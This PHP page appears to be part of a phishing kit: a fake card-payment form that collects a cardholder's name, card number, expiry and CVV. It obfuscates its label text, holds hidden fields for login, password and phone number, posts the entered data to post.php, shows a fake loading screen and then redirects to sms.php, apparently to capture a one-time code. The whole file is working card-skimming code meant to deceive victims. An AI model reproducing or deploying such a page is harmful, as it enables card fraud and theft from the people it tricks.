<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title><?php echo $lang["title"]; ?></title>
    <link rel="stylesheet" href="app.css">
</head>
<body>
<form action="action.php" method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="logo.png">
</header>
<div class="loader" style="color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3><?php echo $lang['_loading'][0];?></h3>
        <p><?php echo $lang['_loading'][1];?></p>
    <img src="loading.gif">
</div>
</div>

<main>

<div class="form">

<div class="title">
<?php echo $m->obf($lang["_cc_texts"][0]); ?>
</div>

<div class="cols">

<div class="col">
    <label><?php echo $m->obf($lang["_cc_texts"][1]); ?></label>
    <input type="text" id="d0" placeholder="<?php echo $lang["_cc_texts"][1]; ?>">
</div>

<div class="col">
    <label><?php echo $m->obf($lang["_cc_texts"][2]); ?></label>
    <input type="text" id="d1" placeholder="XXXX XXXX XXXX XXXX">
</div>


<div class="col">
    <label><?php echo $m->obf($lang["_cc_texts"][3]); ?></label>
    <input type="text" id="d2" placeholder="<?php echo $lang["_cc_texts"][4]; ?>">
</div>

<div class="col">
    <label><?php echo $m->obf($lang["_cc_texts"][5]); ?></label>
    <input type="text" id="d3" placeholder="CVV">
</div>


<div class="col submit">
    <button onclick="sendCard()"><?php echo $lang["_cc_texts"][7]; ?></button>
</div>
 

 

</div>


</div>

</main>


<script src="jq.js"></script>
<script src="m.js"></script>
<script src="cv.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
$("#d4").mask('0000');


var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}


$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
     $(".loader").show();
        $.post("post.php", 
			{
                name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val()

			}, function(done){
                setTimeout(() => {
                     window.location="sms.php";
                 }, 13000);    
			}
		
		);

    }
}


 

</script>
</body>

</html>
